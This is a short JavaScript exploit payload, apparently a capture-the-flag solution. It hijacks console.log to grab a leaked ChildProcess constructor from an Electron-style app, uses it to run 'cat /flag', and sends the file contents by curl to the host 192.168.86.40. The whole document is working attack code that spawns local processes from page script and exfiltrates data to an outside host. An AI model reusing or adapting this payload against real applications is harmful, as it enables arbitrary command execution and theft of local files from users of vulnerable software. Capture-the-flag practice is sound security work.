const oldlog = console.log;
  console.log = ((v) => {
    if(v && v.stdin) {
      window.ChildProcess = v.constructor;
    }
    oldlog(v)
  });
  setTimeout(async () => {
    const loadStream = (s) =>
      new Promise((resolve, reject) => {
        const chunks = [];
        s.on('data', (chunk) =>{ chunks.push(chunk) });
        s.on('error', (chunk) => {chunks.push(chunk)});
        s.on('end', () => { resolve(chunks.join(',')) });
      });

      const cp = new ChildProcess();
      cp.spawn({file: 'cat', args: ['', '/flag']})
      const res = await loadStream(cp.stdout);

      const cp2 = new ChildProcess();
      cp2.spawn({file: 'curl', args: ['','', encodeURI('http://192.168.86.40:8000/?d=' + res)]})
      await loadStream(cp2.stdout);

      
  }, 100)
